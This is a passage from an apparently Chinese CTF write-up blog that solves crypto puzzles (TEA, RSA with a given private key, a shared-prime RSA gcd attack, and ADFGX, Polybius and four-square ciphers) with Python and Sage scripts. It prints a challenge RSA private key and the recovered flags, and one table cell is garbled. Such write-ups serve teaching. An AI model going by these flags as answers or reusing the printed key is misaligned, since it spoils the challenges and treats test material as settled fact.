PK</span>):</span><br><span class="line">    <span class="type">List</span> = []</span><br><span class="line">    ecryptText += (<span class="number">8</span> - <span class="built_in">len</span>(ecryptText) % <span class="number">8</span>) * <span class="built_in">chr</span>(<span class="number">0</span>) <span class="comment">#用0补位，补到8n</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ecryptText)/<span class="number">8</span>): <span class="comment">#8位为一组</span></span><br><span class="line">        p = <span class="number">0</span></span><br><span class="line">        q = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            p+= <span class="built_in">ord</span>(ecryptText[m*<span class="number">8</span>+n]) &lt;&lt; (<span class="number">4</span>-n-<span class="number">1</span>)*<span class="number">8</span></span><br><span class="line">            q+= <span class="built_in">ord</span>(ecryptText[m*<span class="number">8</span>+n+<span class="number">4</span>]) &lt;&lt; (<span class="number">4</span>-n-<span class="number">1</span>)*<span class="number">8</span></span><br><span class="line">        <span class="type">List</span>.append(enflag([p,q],PK))</span><br><span class="line">    <span class="keyword">return</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    flag = xxxx</span><br><span class="line">    PK = [<span class="number">141</span>,<span class="number">262</span>,<span class="number">339</span>,<span class="number">425</span>]</span><br><span class="line">    crypto = str_encoding(flag,PK)</span><br><span class="line">    <span class="built_in">print</span>(crypto)</span><br></pre></td></tr></tbody></table></figure><p>经过分析，该加密为TEA加密算法如下链接有该算法的讲解</p><p><strong><a href="https://www.cnblogs.com/iBinary/p/13844861.html">TEA算法解析 - iBinary - 博客园 (cnblogs.com)</a></strong></p><p>根据算法解密写出脚本</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decipher</span>(<span class="params">i,j</span>):</span><br><span class="line">    First = c_uint32(i[<span class="number">0</span>])</span><br><span class="line">    Second = c_uint32(i[<span class="number">1</span>])</span><br><span class="line">    a = <span class="number">32</span></span><br><span class="line">    tt = <span class="number">0x9e3779b9</span></span><br><span class="line">    add = tt &lt;&lt; <span class="number">5</span></span><br><span class="line">    b = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span>(a&gt;<span class="number">0</span>):</span><br><span class="line">        a -= <span class="number">1</span></span><br><span class="line">        Second.value -= ((First.value &lt;&lt; <span class="number">4</span>) + j[<span class="number">2</span>]) ^ (First.value + add) ^ ((First.value &gt;&gt; <span class="number">5</span>) + j[<span class="number">3</span>])</span><br><span class="line">        First.value -= ((Second.value &lt;&lt; <span class="number">4</span>) + j[<span class="number">0</span>]) ^ (Second.value + add) ^ ((Second.value &gt;&gt; <span class="number">5</span>) + j[<span class="number">1</span>])</span><br><span class="line">        add -= tt</span><br><span class="line">    b[<span class="number">0</span>] = First.value</span><br><span class="line">    b[<span class="number">1</span>] = Second.value</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将大整数转换为常规普通整数</span></span><br><span class="line">c = [[<span class="number">3202805436</span>, <span class="number">509716930</span>], [<span class="number">3140667873</span>, <span class="number">1667141091</span>], [<span class="number">3173275598</span>, <span class="number">2248305098</span>], [<span class="number">709283154</span>, <span class="number">3416762332</span>]]</span><br><span class="line">PK = [<span class="number">141</span>,<span class="number">262</span>,<span class="number">339</span>,<span class="number">425</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    x,y = decipher(c[i],PK)</span><br><span class="line">    <span class="built_in">print</span>(n2s(x),n2s(y))</span><br><span class="line"><span class="comment">#b'{fla' b'g_s1'</span></span><br><span class="line"><span class="comment">#b'_LIN' b'JI_W'</span></span><br><span class="line"><span class="comment">#b'USHU' b'1}ga'</span></span><br><span class="line"><span class="comment">#b'lf\x00\x00' b''</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">b'{fla' b'g_s1'</span><br><span class="line">b'_LIN' b'JI_W'</span><br><span class="line">b'USHU' b'1}ga'</span><br><span class="line">b'lf\x00\x00' b''</span><br></pre></td></tr></tbody></table></figure><p>合并一下</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">{flag_s1_LINJI_WUSHU1}galf</span><br></pre></td></tr></tbody></table></figure><p>逆序输出</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">s = <span class="string">'{flag_s1_LINJI_WUSHU1}galf'</span></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#flag}1UHSUW_IJNIL_1s_galf{</span></span><br></pre></td></tr></tbody></table></figure><p>flag{1UHSUW_IJNIL_1s_galf}</p><h1 id="BabyRSA"><a href="#BabyRSA" class="headerlink" title="BabyRSA"></a>BabyRSA</h1><p>题目给出附件</p><p>flag.txt</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">??4N鄮?挅?编佔tQ&gt;鴅鏠(Tk-0&lt;瑗5G??`靖縓lfTGj?繤而?X??棭GP甕;F╡3%泟o?腟?R蒣Q畋慱?吰"堑`&amp;~芈:＄2淨靼熙b?</span><br></pre></td></tr></tbody></table></figure><p>private.key</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQCsWryPAQj9cp1O9UDVRQEWg3k7dsQfalNs8Xa4/ZOsTVvWwfu6</span><br><span class="line">EPWbr3av5ewn/SCWqJbltLaJd122sBH1lcPygyxTtkQvPCamnVdtN+3qzZ0VxZkT</span><br><span class="line">i7jaoR+SPgsPEiCZYN0JsJ104A0SZ0bXtAslmpIc4sE/+kqHSd5dfZmHVQIDAQAB</span><br><span class="line">AoGBAKXl6N2VV3vtmLFprHAcLYHoJwcvuHOsuoSAn5BMtJoDFEVRDuX4cRDcAdgp</span><br><span class="line">7fhH09hwil6sZY9IEDJKo97Ju4LcjrT3UtOGXWJOeEZCJHfP5s/62/2lZCAHjK3G</span><br><span class="line">V1udujf1K0g0M0RcZLE41Rep8zKj/ASr4cmXkQgEgZ4gsII5AkEA1BP03n7liHYj</span><br><span class="line">9SMoUVGceGtBhvyfVjzU74q1TFpmhWzQ3/hMqIfI498I5+voPBnFJj1Op1aE2wHH</span><br><span class="line">RVKtnlqW3wJBANAMs3TXKCTP/cJm0LRXttzXgpID/jkY4e0KHZhpuJdkbBFs+Z1Z</span><br><span class="line">BxfgfHwXVO17O1VOwZZNf2uh//oeFqH/LEsCQEJ70xrhCxHhf1o84EnF3Nh/PzaT</span><br><span class="line">AVxmi5ZglH9QI62WNFDSJS38C0UsST1zXgVhSsW3GG4rGFET2KVpytXGrl8CQHS1</span><br><span class="line">a0Y0HFTqSJPxUUqZmf8w9hIrI0Wsa7CpaAjD5cUnlGgCFdTqyEvgpnSGMiI2awZj</span><br><span class="line">87z5JG2gpxQMJO4jUxkCQBiGHY58w0/yuRRr6HnAbF1LiS7JzedbXK3f3vO/IhMs</span><br><span class="line">jZPBfOdeQyWnih3FT83o+L/u+PfUIEy9iaz0+KriuHQ=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line">private_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">'private.key'</span>,<span class="string">'r'</span>).read())</span><br><span class="line">c = <span class="built_in">open</span>(<span class="string">'flag.txt'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">cipher_obj = PKCS1_v1_5.new(private_key)</span><br><span class="line">random_generator = Random.new().read</span><br><span class="line">plain_text = cipher_obj.decrypt(c,random_generator)</span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br><span class="line"><span class="comment">#b'flag{57c2f8cf484134e31167e294cc8441c3}'</span></span><br></pre></td></tr></tbody></table></figure><p>另一种：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">题目给出了RSA的私钥文件和密文，因为RSA是非对称加密算法：公钥加密，私钥解密。因此针对密文通过私钥可以还原出明文值，而明文值就是本题对应所求的flag。</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240103104458038-1095843221-17049882524001.png" alt="image-20240103104453201"></p><h1 id="EasyRsa"><a href="#EasyRsa" class="headerlink" title="EasyRsa"></a>EasyRsa</h1><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getPrime</span><br><span class="line"><span class="keyword">import</span> gmpy2, os</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(flag1,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n).strip(<span class="string">"L"</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c).strip(<span class="string">"L"</span>))</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(flag2,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n).strip(<span class="string">"L"</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c).strip(<span class="string">"L"</span>))</span><br><span class="line"><span class="comment"># 0x6364991c9ff97120fa450866ab1a3a0bd4e16bd71c8f7a0a4229b1307531fef6e2cb2410c3283db91e49476a8afcd590aedc3384b5045b2fb57208587a242e94e7528ea4998b66f3a57c7ac66b806d9631f8cff3e73557630a0e70467b5f6246ee3fbc6ed89d00af1e931cfabbc5f1deddb99a14dfac51820ffe48f2841bc1a1</span></span><br><span class="line"><span class="comment"># 0x17343966398f483e121de6c2515d630ebc31b0cbdbed5cdc2c09c2b253fc0bc9a055e222eac108e189b6bd6a705d2972c5ce435fa5a4469602bb7a0d0ee95c3f397a3fa4985e6cb7531eb1b5603be134d0dce2c47069d216063b5aea135681edebcfb20c86c3ab09c350901639ee5f74831b056b33c7c26fcef7a34fd39e9dab</span></span><br><span class="line"><span class="comment"># 0x4bf20122dc9f3fbd31bf4389d2a497392caa3de045fe217b692620874ce7a63146c6348c3f65a08bd3f9ec893236e904ceac4e54acdf04e198e7d2bb085c4d646be300158bafc27615875f65d2d1b196d14c024de581f511519631da1d727d6b4fd9c02298b6334938e5a6a7616389948fb9f35677fad6d596d95e5e67aa5549</span></span><br><span class="line"><span class="comment"># 0x2583826196498e3c4b5e1c9c967a74337e85f2b4f9827f2e0a164e3923644a3859c85bf8248ddfcb90f03c31f8704548d7dfd071581eee8a268ef715f93636485b56e559eef55ceee7a54706cf12717d035cc1f6fca838e8ce32fcbd413565ff78500c9810ff8c22ae09d3746b927b4768fc92e6d46a2dfb395cd14ae1321fd0</span></span><br></pre></td></tr></tbody></table></figure><p>读代码，显然是公用一个p</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">0x6364991c9ff97120fa450866ab1a3a0bd4e16bd71c8f7a0a4229b1307531fef6e2cb2410c3283db91e49476a8afcd590aedc3384b5045b2fb57208587a242e94e7528ea4998b66f3a57c7ac66b806d9631f8cff3e73557630a0e70467b5f6246ee3fbc6ed89d00af1e931cfabbc5f1deddb99a14dfac51820ffe48f2841bc1a1</span></span><br><span class="line">n2 = <span class="number">0x4bf20122dc9f3fbd31bf4389d2a497392caa3de045fe217b692620874ce7a63146c6348c3f65a08bd3f9ec893236e904ceac4e54acdf04e198e7d2bb085c4d646be300158bafc27615875f65d2d1b196d14c024de581f511519631da1d727d6b4fd9c02298b6334938e5a6a7616389948fb9f35677fad6d596d95e5e67aa5549</span></span><br><span class="line">c1 = <span class="number">0x17343966398f483e121de6c2515d630ebc31b0cbdbed5cdc2c09c2b253fc0bc9a055e222eac108e189b6bd6a705d2972c5ce435fa5a4469602bb7a0d0ee95c3f397a3fa4985e6cb7531eb1b5603be134d0dce2c47069d216063b5aea135681edebcfb20c86c3ab09c350901639ee5f74831b056b33c7c26fcef7a34fd39e9dab</span></span><br><span class="line">c2 = <span class="number">0x2583826196498e3c4b5e1c9c967a74337e85f2b4f9827f2e0a164e3923644a3859c85bf8248ddfcb90f03c31f8704548d7dfd071581eee8a268ef715f93636485b56e559eef55ceee7a54706cf12717d035cc1f6fca838e8ce32fcbd413565ff78500c9810ff8c22ae09d3746b927b4768fc92e6d46a2dfb395cd14ae1321fd0</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">q2 = n2//p</span><br><span class="line">d1 = gmpy2.invert(e,(p-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e,(p-<span class="number">1</span>)*(q2-<span class="number">1</span>))</span><br><span class="line">m1 = long_to_bytes(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line">m2 = long_to_bytes(<span class="built_in">pow</span>(c2,d2,n2))</span><br><span class="line"><span class="built_in">print</span>(m1+m2)</span><br><span class="line"><span class="comment">#b'flag{c9bee33232dbbf7872763d69d769c74d}'</span></span><br></pre></td></tr></tbody></table></figure><h1 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">FGAFDAXAGXDGDXAXAGDDAFDAAFFGFDAFGX</span><br></pre></td></tr></tbody></table></figure><p>明显是ADFGX加密，字母表默认，密钥classic</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># ADFGX密码</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">INDEX_DIC = <span class="string">"ADFGX"</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_table</span>(<span class="params">table</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(table) != <span class="number">25</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sort_key</span>(<span class="params">key</span>):</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    key_lis = re.findall(<span class="string">"."</span>, key)</span><br><span class="line">    index_lis = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len)]</span><br><span class="line">    <span class="comment"># print(key_lis)</span></span><br><span class="line">    <span class="comment"># print(index_lis)</span></span><br><span class="line">    <span class="comment"># 冒泡法</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(key_len-i-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> key_lis[j] &gt; key_lis[j+<span class="number">1</span>]:</span><br><span class="line">                key_lis[j], key_lis[j+<span class="number">1</span>] = key_lis[j+<span class="number">1</span>], key_lis[j]</span><br><span class="line">                index_lis[j], index_lis[j+<span class="number">1</span>] = index_lis[j+<span class="number">1</span>], index_lis[j]</span><br><span class="line">    <span class="comment"># print(key_lis)</span></span><br><span class="line">    <span class="comment"># print(index_lis)</span></span><br><span class="line">    <span class="keyword">return</span> index_lis</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_adfgx</span>(<span class="params">string, table, key</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> judge_table(table):</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    ciphertext = <span class="string">""</span></span><br><span class="line">    ciphertext_temp = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.replace(<span class="string">"j"</span>, <span class="string">"i"</span>):</span><br><span class="line">        index = table.index(i)</span><br><span class="line">        ciphertext_temp += INDEX_DIC[index // <span class="number">5</span>] + INDEX_DIC[index % <span class="number">5</span>]</span><br><span class="line">    ciphertext_lis = re.findall(<span class="string">".{1,"</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(key))+<span class="string">"}"</span>, ciphertext_temp)</span><br><span class="line">    <span class="comment"># print("ciphertext_lis", ciphertext_lis)</span></span><br><span class="line">    sort_index = sort_key(key)</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> sort_index:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> ciphertext_lis:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ciphertext += j[index]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># print(ciphertext_temp)</span></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_adfgx</span>(<span class="params">string, table, key</span>):</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    string_len = <span class="built_in">len</span>(string)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> judge_table(table):</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> string_len % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    plaintext = <span class="string">""</span></span><br><span class="line">    plaintext_temp = <span class="string">""</span></span><br><span class="line">    plaintext_lis = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 一列最小个数</span></span><br><span class="line">    min_lin = string_len // key_len</span><br><span class="line">    <span class="comment"># 有多少最大个数的列</span></span><br><span class="line">    max_col = string_len % key_len</span><br><span class="line">    <span class="comment"># print(f"m={m}, n={n}")</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 分组</span></span><br><span class="line">    sort_index = sort_key(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sort_index:</span><br><span class="line">        <span class="keyword">if</span> i &lt; max_col:</span><br><span class="line">            plaintext_lis.append(string[index:index+min_lin+<span class="number">1</span>])</span><br><span class="line">            index += min_lin+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext_lis.append(string[index:index+min_lin])</span><br><span class="line">            index += min_lin</span><br><span class="line">    <span class="comment"># 还原列顺序</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(key_len-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(key_len-i-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> sort_index[j] &gt; sort_index[j+<span class="number">1</span>]:</span><br><span class="line">                sort_index[j], sort_index[j+<span class="number">1</span>] = sort_index[j+<span class="number">1</span>], sort_index[j]</span><br><span class="line">                plaintext_lis[j], plaintext_lis[j+<span class="number">1</span>] = plaintext_lis[j+<span class="number">1</span>], plaintext_lis[j]</span><br><span class="line">    <span class="comment"># 合成字符串，并转为横纵坐标</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_lin+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> plaintext_lis:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                plaintext_temp += <span class="built_in">str</span>(INDEX_DIC.index(j[i]))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># 查表</span></span><br><span class="line">    plaintext_num_lis = re.findall(<span class="string">".{2}"</span>, plaintext_temp)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> plaintext_num_lis:</span><br><span class="line">        plaintext += table[<span class="built_in">int</span>(i[<span class="number">0</span>])*<span class="number">5</span> + <span class="built_in">int</span>(i[<span class="number">1</span>])]</span><br><span class="line">    <span class="comment"># print(plaintext_temp)</span></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    table_ = <span class="string">"phqgmeaynofdxkrcvszwbutil"</span> <span class="comment">#默认字母表，如需替换，另附</span></span><br><span class="line">    key_ = <span class="string">"classic"</span>    <span class="comment">#密码</span></span><br><span class="line">    m = <span class="string">"njntysecu"</span>     <span class="comment">#待加密明文</span></span><br><span class="line">    c = <span class="string">"FGAFDAXAGXDGDXAXAGDDAFDAAFFGFDAFGX"</span>    <span class="comment">#待解密密文</span></span><br><span class="line">    ciphertext_ = encrypt_adfgx(m, table_, key_)</span><br><span class="line">    plaintext_ = decrypt_adfgx(c[::-<span class="number">1</span>], table_, key_)<span class="comment">#c[::-1]目的是令密文倒序</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"<span class="subst">{plaintext_}</span>: <span class="subst">{ciphertext_}</span>"</span>)</span><br><span class="line"><span class="comment"># flagisadfgxcipher</span></span><br></pre></td></tr></tbody></table></figure><p>提交不正确，转MD5小写</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{2520c00687b0e5924a0d07fc33e86292}</span><br></pre></td></tr></tbody></table></figure><h1 id="波奥比利斯"><a href="#波奥比利斯" class="headerlink" title="波奥比利斯"></a>波奥比利斯</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">hint:74686973206973206D643520426F6F6D21</span><br><span class="line"></span><br><span class="line">6cd29f23de85b1309128ff736c7efbf6</span><br><span class="line">efa4e6f5c6359cc2eadc5d731716468e</span><br><span class="line">408a9c4a79800232ac656249af3162eb</span><br><span class="line">6adff50182df8ad3b836f7fb9dc5c4ab</span><br><span class="line">6ae0af41daeb79509ab3b47b5ed8a687</span><br><span class="line"></span><br><span class="line">key:qwertyuiopasdfghjklzxcvbn</span><br></pre></td></tr></tbody></table></figure><p>hint部分是十六进制，转文本看看</p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104000831922-790004452-17049882894513.png" alt="image-20240104000140481"></p><p>这是md5爆破</p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104000829064-1717706270-17049882894515.png" alt="image-20240104000350650"></p><p>得到</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">43341353524234134123511341</span><br></pre></td></tr></tbody></table></figure><p>易知是波利比奥斯密码的密文。附件中也给了密钥：qwertyuiopasdfghjklzxcvbn<br><img src="/2024/01/08/polard-n-crypto-kun-nan/3338005-20240104000820415-360152841-17049882894517.png" alt="image-20240104000817214"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{polarstar}</span><br></pre></td></tr></tbody></table></figure><h1 id="四个正方形"><a href="#四个正方形" class="headerlink" title="四个正方形"></a>四个正方形</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">不要QQ.txt</span><br><span class="line">明文:cajfedlarc</span><br><span class="line">hint:两个key是该密码创始人的姓名</span><br></pre></td></tr></tbody></table></figure><p>四个方块应该是四方密码，题目提示的也很明确，去掉字母q</p><p><strong>四方密码</strong>是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明</p><table><thead><tr><th align="center">a</th><th align="center">b</th><th align="center">c</th><th align="center">d</th><th align="center">e</th><th></th><th align="center">f</th><th align="center">e</th><th align="center">l</th><th align="center">i</th><th align="center">x</th></tr></thead><tbody><tr><td align="center">f</td><td align="center">g</td><td align="center">h</td><td align="center">i</td><td align="center">j</td><td></td><td align="center">a</td><td align="center">b</td><td align="center">c</td><td align="center">d</td><td align="center">g</td></tr><tr><td align="center">k</td><td align="center">l</td><td align="center">m</td><td align="center">n</td><td align="center">o</td><td></td><td align="center">h</td><td align="center">j</td><td align="center">k</td><td align="center">m</td><td align="center">n</td></tr><tr><td align="center">p</td><td align="center">r</td><td align="center">s</td><td align="center">t</td><td align="center">u</td><td></td><td align="center">o</td><td align="center">p</td><td align="center">r</td><td align="center">s</td><td align="center">t</td></tr><tr><td align="center">v</td><td align="center">w</td><td align="center">x</td><td align="center">y</td><td align="center">z</td><td></td><td align="center">u</td><td align="center">v</td><td align="center">w</td><td align="center">y</td><td align="center">z</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">xxxxxxxxxx1&nbsp;1flag{b5ff0893e6522a037c144a1f502c2b48}txt</td><td align="center">e</td><td align="center">l</td><td align="center">a</td><td align="center">s</td><td></td><td align="center">a</td><td align="center">b</td><td align="center">c</td><td align="center">d</td><td align="center">e</td></tr><tr><td align="center">t</td><td align="center">b</td><td align="center">c</td><td align="center">f</td><td align="center">g</td><td></td><td align="center">f</td><td align="center">g</td><td align="center">h</td><td align="center">i</td><td align="center">j</td></tr><tr><td align="center">h</td><td align="center">i</td><td align="center">j</td><td align="center">k</td><td align="center">m</td><td></td><td align="center">k</td><td align="center">l</td><td align="center">m</td><td align="center">n</td><td align="center">o</td></tr><tr><td align="center">n</td><td align="center">o</td><td align="center">p</td><td align="center">r</td><td align="center">u</td><td></td><td align="center">p</td><td align="center">r</td><td align="center">s</td><td align="center">t</td><td align="center">u</td></tr><tr><td align="center">v</td><td align="center">w</td><td align="center">x</td><td align="center">y</td><td align="center">z</td><td></td><td align="center">v</td><td align="center">w</td><td align="center">x</td><td align="center">y</td><td align="center">z</td></tr></tbody></table><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">明文两两一组，分别作为矩形的两个顶点，补全矩形，另外两个顶点，先右上，后左下，对应得到密文</span><br></pre></td></tr></tbody></table></figure><p>对“flagishere“MD5小写</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{eedda7bea3964bfb288ca6004a973c2a}</span><br></pre></td></tr></tbody></table></figure><h1 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h1><p>下载后发现是一个可执行exe文件，第一题是求1998阶乘，取前十位，在sagemath中计算</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">[*]LEVEL 1</span><br><span class="line">[*]v = 1998*1997*1996*1995...*3*2*1</span><br><span class="line">[*]str(v)[0:10]=?</span><br><span class="line">[*]Please input your ansewer:</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-kun-nan/image-20231231024158408-17049882894529.png" alt="image-20231231024158408"></p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/image-20231231024215244-170498828945211.png" alt="image-20231231024215244"></p><p>第二关</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">[*]LEVEL 2</span><br><span class="line">[*]φ(718)=?</span><br><span class="line">[*]hint:Euler's totient function</span><br><span class="line">[*]Please input your ansewer:</span><br></pre></td></tr></tbody></table></figure><p>百度一下可以得知是欧拉函数，欧拉函数φ(N)表示小于或等于N的正整数中与N互质的数的个数。</p><p>在sage中求解欧拉函数可以用euler_phi()，可得 358</p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/image-20231231024413029-170498828945213.png" alt="image-20231231024413029"></p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/image-20231231024354567-170498828945215.png" alt="image-20231231024354567"></p><p>第三关</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">[*]LEVEL 3</span><br><span class="line">[*]3*x+z-y=14,2*y+3*x-z=439,x+y+z=318</span><br><span class="line">[*]x = :</span><br></pre></td></tr></tbody></table></figure><p>解方程</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">x,y,z = var('x y z')</span><br><span class="line">solve([3*x+z-y==14,2*y+3*x-z==439,x+y+z==318],x,y,z)</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-kun-nan/image-20231231024559333-170498828945217.png" alt="image-20231231024559333"></p><p><img src="/2024/01/08/polard-n-crypto-kun-nan/image-20231231024608885-170498828945219.png" alt="image-20231231024608885"></p><p>拿到flag{2381885c659b0eb108fe24c4297e5c04}</p><h1 id="大主教的猪"><a href="#大主教的猪" class="headerlink" title="大主教的猪"></a>大主教的猪</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">大主教开的猪圈里的所有猪都不见了，你能帮大主教找到他们在哪吗？</span><br><span class="line">hint：得到的结果小写套上flag{}提交。</span><br></pre></td></tr></tbody></table></figure><p><img 